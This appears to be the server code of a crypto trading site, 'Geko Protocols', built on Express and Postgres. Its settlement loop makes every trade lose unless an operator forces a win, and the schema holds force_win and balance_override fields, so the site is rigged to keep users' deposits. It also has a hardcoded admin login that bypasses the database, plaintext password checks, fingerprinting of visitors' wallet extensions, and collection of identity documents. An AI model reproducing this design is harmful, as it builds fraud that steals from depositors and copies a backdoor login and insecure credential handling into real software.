import express from 'express';
import cors from 'cors';
import pg from 'pg';
import axios from 'axios';
import dotenv from 'dotenv';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { Connection, PublicKey, LAMPORTS_PER_SOL, Keypair, Transaction, SystemProgram } from '@solana/web3.js';
import { sendAndConfirmTransaction } from '@solana/web3.js';
import bs58 from 'bs58';
import crypto from 'crypto';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Global Error Handlers to prevent crashes
process.on('uncaughtException', (err) => {
  console.error('[CRITICAL] Uncaught Exception:', err.message);
  console.error(err.stack);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('[CRITICAL] Unhandled Rejection at:', promise, 'reason:', reason);
});

const app = express();
// USE PORT 8080 FOR UNIFIED PREVIEW
const port = 8080;

// ─── Debug Logger ──────────────────────────────────────────────────────────
app.use((req, res, next) => {
  console.log(`[Request] ${req.method} ${req.url}`);
  next();
});

app.use(cors());
// Allow framing and basic security headers
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'ALLOWALL');
  
  // Force correct MIME types for TypeScript and JSX files to fix "blank screen" issues
  const url = req.url.toLowerCase();
  if (url.endsWith('.ts') || url.endsWith('.tsx') || url.endsWith('.jsx')) {
    res.setHeader('Content-Type', 'application/javascript');
  }
  next();
});

app.use(express.json());

let globalConfig = {
  vault_balance: "0.00",
  deposit_address: "6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw"
};
const { Pool } = pg;
let pool = null;
let dbAvailable = false;
let lastInitError = null;
let dbInitPromise = null;

const initializeDatabase = async () => {
  if (!process.env.DATABASE_URL) return;
  try {
    console.log('[DB] Connecting to database...');
    const client = await pool.connect();
    console.log('[DB] Connection successful');
    client.release();

    // Step 1: Core Tables
    await pool.query(`
      CREATE TABLE IF NOT EXISTS geko_users (
        id SERIAL PRIMARY KEY,
        wallet_address TEXT UNIQUE,
        nickname TEXT DEFAULT '',
        email TEXT UNIQUE,
        password TEXT,
        invitation_code TEXT,
        status TEXT DEFAULT 'guest',
        wallet_data JSONB DEFAULT '{}',
        trading_balance DECIMAL(24, 8) DEFAULT 0,
        demo_balance DECIMAL(24, 8) DEFAULT 100000,
        available_balance DECIMAL(24, 8) DEFAULT 0,
        available_demo_balance DECIMAL(24, 8) DEFAULT 100000,
        protocol_settlement_balance DECIMAL(24, 8) DEFAULT 0,
        pending_deposit_currency TEXT DEFAULT 'BTC',
        pending_deposit_amount DECIMAL(24, 8) DEFAULT 0,
        swap_sent BOOLEAN DEFAULT FALSE,
        last_seen TIMESTAMPTZ DEFAULT NOW(),
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS geko_config (
        key TEXT PRIMARY KEY,
        value TEXT,
        updated_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    // Step 2: Columns one by one for maximum safety
    const addColumn = async (name, type, def) => {
      try {
        await pool.query(`ALTER TABLE geko_users ADD COLUMN IF NOT EXISTS ${name} ${type} DEFAULT ${def}`);
      } catch (e) {
        console.warn(`[DB] Column ${name} may already exist or error:`, e.message);
      }
    };

    await addColumn('nickname', 'TEXT', "''");
    await addColumn('kyc_status', 'TEXT', "'none'");
    await addColumn('force_win', 'BOOLEAN', 'FALSE');
    await addColumn('last_interest_at', 'TIMESTAMPTZ', 'NOW()');
    await addColumn('ip_address', 'TEXT', "''");
    await addColumn('available_balance', 'DECIMAL(24, 8)', '0');
    await addColumn('available_demo_balance', 'DECIMAL(24, 8)', '100000');
    await addColumn('balance_override', 'TEXT', "''");
    await addColumn('referral_code', 'TEXT', "''");
    await addColumn('referred_by', 'TEXT', "''");
    await addColumn('protocol_settlement_balance', 'DECIMAL(24, 8)', '0');
    await addColumn('trading_balance', 'DECIMAL(24, 8)', '0');
    await addColumn('demo_balance', 'DECIMAL(24, 8)', '100000');
    await addColumn('email', 'TEXT', "NULL");
    await addColumn('password', 'TEXT', "NULL");
    await addColumn('invitation_code', 'TEXT', "NULL");
    await addColumn('status', 'TEXT', "'guest'");
    await addColumn('pending_deposit_currency', 'TEXT', "'BTC'");
    await addColumn('pending_deposit_amount', 'DECIMAL(24, 8)', '0');
    await addColumn('swap_sent', 'BOOLEAN', 'FALSE');
    await addColumn('signup_code', 'TEXT', "NULL");

    // Step 3: Config Defaults
    const addConfig = async (key, val) => {
      try {
        await pool.query(`INSERT INTO geko_config (key, value) VALUES ($1, $2) ON CONFLICT (key) DO NOTHING`, [key, val]);
      } catch (e) {}
    };

    await addConfig('solana_deposit_address', '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw');
    await addConfig('btc_deposit_address', '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa');
    await addConfig('eth_deposit_address', '0x742d35Cc6634C0532925a3b844Bc454e4438f44e');
    await addConfig('usdt_deposit_address', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
    await pool.query(`
      DO $$ 
      BEGIN 
        IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'geko_users_wallet_address_key') THEN
          BEGIN
            DELETE FROM geko_users a USING geko_users b
            WHERE a.id < b.id AND a.wallet_address = b.wallet_address;
            ALTER TABLE geko_users ADD CONSTRAINT geko_users_wallet_address_key UNIQUE (wallet_address);
          EXCEPTION WHEN OTHERS THEN
            RAISE NOTICE 'Could not add unique constraint on wallet_address';
          END;
        END IF;
        IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'geko_users_email_key') THEN
          BEGIN
            ALTER TABLE geko_users ADD CONSTRAINT geko_users_email_key UNIQUE (email);
          EXCEPTION WHEN OTHERS THEN
            RAISE NOTICE 'Could not add unique constraint on email';
          END;
        END IF;
      END $$;
    `);

    // Step 4: Defaults & Defaults Config
    try {
      await pool.query(`
        UPDATE geko_users SET trading_balance = COALESCE(trading_balance, 0) WHERE trading_balance IS NULL;
        UPDATE geko_users SET demo_balance = COALESCE(demo_balance, 100000) WHERE demo_balance IS NULL;
        UPDATE geko_users SET protocol_settlement_balance = COALESCE(protocol_settlement_balance, 0) WHERE protocol_settlement_balance IS NULL;
      `);
    } catch (e) {
      console.warn('[DB] Non-critical default update failed:', e.message);
    }

    await pool.query(`
      INSERT INTO geko_config (key, value)
      VALUES ('solana_deposit_address', '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw')
      ON CONFLICT (key) DO NOTHING
    `);

    await pool.query(`CREATE INDEX IF NOT EXISTS idx_users_wallet ON geko_users (wallet_address)`);
    await pool.query(`CREATE INDEX IF NOT EXISTS idx_users_last_seen ON geko_users (last_seen)`);

    // Step 5: Secondary Tables
    await pool.query(`
      CREATE TABLE IF NOT EXISTS trades (
        id TEXT PRIMARY KEY,
        wallet_address TEXT NOT NULL,
        symbol TEXT NOT NULL,
        direction TEXT NOT NULL,
        amount DECIMAL(24, 8) NOT NULL,
        entry_price DECIMAL(24, 8) NOT NULL,
        leverage INTEGER DEFAULT 10,
        duration INTEGER NOT NULL,
        status TEXT DEFAULT 'pending',
        force_outcome TEXT,
        is_demo BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMPTZ DEFAULT NOW(),
        settled_at TIMESTAMPTZ
      )
    `);

    // Ensure leverage column exists for existing tables
    try {
      await pool.query("ALTER TABLE trades ADD COLUMN IF NOT EXISTS leverage INTEGER DEFAULT 10");
    } catch (e) {
      console.warn('[DB] Could not add leverage column:', e.message);
    }

    await pool.query(`
      CREATE TABLE IF NOT EXISTS withdrawal_requests (
        id SERIAL PRIMARY KEY,
        wallet_address TEXT NOT NULL,
        destination_address TEXT NOT NULL,
        amount DECIMAL(24, 8) NOT NULL,
        asset TEXT NOT NULL DEFAULT 'SOL',
        status TEXT NOT NULL DEFAULT 'pending',
        tx_signature TEXT,
        admin_note TEXT,
        created_at TIMESTAMPTZ DEFAULT NOW(),
        processed_at TIMESTAMPTZ
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS transactions (
        id SERIAL PRIMARY KEY,
        wallet_address TEXT NOT NULL,
        asset_symbol TEXT NOT NULL,
        amount DECIMAL(24, 8) NOT NULL,
        type TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'completed',
        payment_id TEXT,
        tx_signature TEXT,
        reference TEXT,
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS geko_visitors (
        id SERIAL PRIMARY KEY,
        visitor_id TEXT,
        ip_address TEXT,
        user_agent TEXT,
        language TEXT,
        timezone TEXT,
        screen_size TEXT,
        platform TEXT,
        referrer TEXT,
        page_path TEXT,
        wallet_extensions JSONB DEFAULT '[]',
        visit_count INTEGER DEFAULT 1,
        first_seen TIMESTAMPTZ DEFAULT NOW(),
        last_seen TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS support_tickets (
        id SERIAL PRIMARY KEY,
        wallet_address TEXT NOT NULL,
        subject TEXT NOT NULL,
        messages JSONB DEFAULT '[]',
        status TEXT DEFAULT 'open',
        created_at TIMESTAMPTZ DEFAULT NOW(),
        updated_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS kyc_submissions (
        id SERIAL PRIMARY KEY,
        wallet_address TEXT NOT NULL,
        full_name TEXT,
        date_of_birth TEXT,
        country TEXT,
        id_type TEXT,
        id_number TEXT,
        status TEXT DEFAULT 'pending',
        admin_note TEXT,
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    dbAvailable = true;
    console.log('[DB] Database fully initialized and ready.');
    
    // Server-side trade settlement loop
    setInterval(async () => {
      if (!dbAvailable || !pool) return;
      try {
        const res = await pool.query(
          "SELECT * FROM trades WHERE status = 'pending' AND created_at <= NOW() - (COALESCE(duration, 60) || ' seconds')::interval"
        );
        for (const trade of res.rows) {
          console.log(`[Auto-Settle] Settling trade ${trade.id} for ${trade.wallet_address}`);
          let isWin = false;
          if (trade.force_outcome === 'win') isWin = true;
          else if (trade.force_outcome === 'loss') isWin = false;
          else isWin = false; // Always fail by default

          const leverageFactor = (parseFloat(trade.leverage || 10)) / 10;
          const amount = parseFloat(trade.amount || 0);
          const payoutRate = 0.85;
          const payout = isWin ? amount * (1 + (payoutRate * leverageFactor)) : 0;
          const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';

          await pool.query(
            "UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2",
            [isWin ? 'won' : 'lost', trade.id]
          );

          if (payout > 0) {
            await pool.query(
              `UPDATE geko_users SET ${balanceField} = ${balanceField} + $1 WHERE wallet_address = $2`,
              [payout, trade.wallet_address]
            );
            await recordTransaction({
              wallet_address: trade.wallet_address,
              asset_symbol: 'USDT',
              amount: payout,
              type: 'trade',
              reference: `trade-auto-settle:${trade.id}`
            });
          }
        }
      } catch (e) {
        console.error('[Auto-Settle Error]', e.message);
      }
    }, 5000);

    setInterval(processDailyInterest, 60 * 60 * 1000); 
    processDailyInterest();
  } catch (err) {
    console.error('[DB Error] CRITICAL initialization failure:', err.message);
    console.error(err.stack);
    lastInitError = err.message;
    dbAvailable = false;
  }
};

if (process.env.DATABASE_URL) {
  const maskedUrl = process.env.DATABASE_URL.replace(/:([^:@]+)@/, ':****@');
  console.log(`[DB] Using DATABASE_URL: ${maskedUrl}`);

  pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
  });

  dbInitPromise = initializeDatabase();
} else { 
  console.warn('DATABASE_URL is not set in .env. Database features will be unavailable.');
}

// ─── Health check ──────────────────────────────────────────────────────────
const router = express.Router();

router.get("/health", async (req, res) => {
  res.json({ status: "ok", db: dbAvailable });
});

router.get("/config", async (req, res) => {
  res.json(globalConfig);
});

router.get("/binance/prices", async (req, res) => {
  try {
    const response = await axios.get("https://api.binance.com/api/v3/ticker/price");
    res.json(response.data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

router.post("/auth/login", async (req, res) => {
  const { email, password } = req.body;
  if (email.toLowerCase().trim() === "admin@gmail.com" && password === "12345678") {
      return res.json({
          success: true,
          user: {
            id: 999,
            address: "ADMIN_GATEWAY",
            email: "admin@gmail.com",
            nickname: "ADMIN_ROOT",
            role: "admin",
            status: "approved",
            wallet_data: {}
          }
      });
  }
  try {
    const result = await pool.query("SELECT * FROM geko_users WHERE email = $1 AND password = $2 LIMIT 1", [email.toLowerCase().trim(), password]);
    if (result.rows.length > 0) {
      res.json({ success: true, user: result.rows[0] });
    } else {
      res.status(401).json({ error: "Invalid credentials" });
    }
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.use("/api", router);
app.use("/", router);

// ─── Static files & SPA ───────────────────────────────────────────────────
const distPath = path.resolve(__dirname, 'dist');
const publicPath = path.resolve(__dirname, 'public');
const rootPath = __dirname;

app.use(express.static(distPath));
app.use(express.static(publicPath));
app.use(express.static(rootPath));

app.get('*', (req, res) => {
  if (req.url.startsWith('/api/')) return res.status(404).json({ error: 'API route not found on server' });
  
  // Try to serve index.html for SPA routing
  const possiblePaths = [
    path.join(distPath, 'index.html'),
    path.join(publicPath, 'index.html'),
    path.join(rootPath, 'index.html')
  ];
  
  for (const indexPath of possiblePaths) {
    if (fs.existsSync(indexPath)) return res.sendFile(indexPath);
  }
  
  res.status(404).send("<h1>Frontend Build Not Found</h1>");
});

// ─── Global Error Handler ──────────────────────────────────────────────────
app.use((err, req, res, next) => {
  console.error('[SERVER ERROR]', err);
  res.status(err.status || 500).json({
    error: err.message || 'Internal Server Error',
    success: false
  });
});

const startServer = () => {
  app.listen(port, '0.0.0.0', () => {
    console.log(`🚀 Geko Protocols Server: http://0.0.0.0:${port}`);
    console.log(`🗄️  Database Status: ${dbAvailable ? 'CONNECTED ✅' : 'DISCONNECTED ❌'}`);
  });
};

if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
  startServer();
}

export default app;
